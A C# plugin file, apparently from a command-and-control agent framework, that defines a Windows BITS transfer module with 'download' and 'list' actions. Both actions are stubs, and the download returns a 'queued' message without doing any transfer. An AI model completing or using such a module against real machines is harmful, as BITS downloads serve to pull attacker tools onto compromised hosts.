using System.Runtime.InteropServices;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "bits-transfer";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    messageManager.Write(
                        "BITS transfer is only available on Windows",
                        job.task.id, true, "error");
                    return;
                }

                var args = JsonSerializer.Deserialize<bits_transfer.BitsTransferArgs>(
                    job.task.parameters) ?? new bits_transfer.BitsTransferArgs();

                string result = args.action switch
                {
                    "download" => StartDownload(args),
                    "list" => ListJobs(),
                    _ => throw new ArgumentException($"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private string StartDownload(bits_transfer.BitsTransferArgs args)
        {
            if (string.IsNullOrEmpty(args.url) || string.IsNullOrEmpty(args.path))
                throw new ArgumentException("URL and path are required for BITS download");

            // BITS COM interop is complex — provide a stub for now
            return $"BITS download queued: {args.url} -> {args.path} (job: {args.job_name}). Full COM implementation pending.";
        }

        private string ListJobs()
        {
            return "BITS job listing via COM interop is not yet implemented";
        }
    }
}
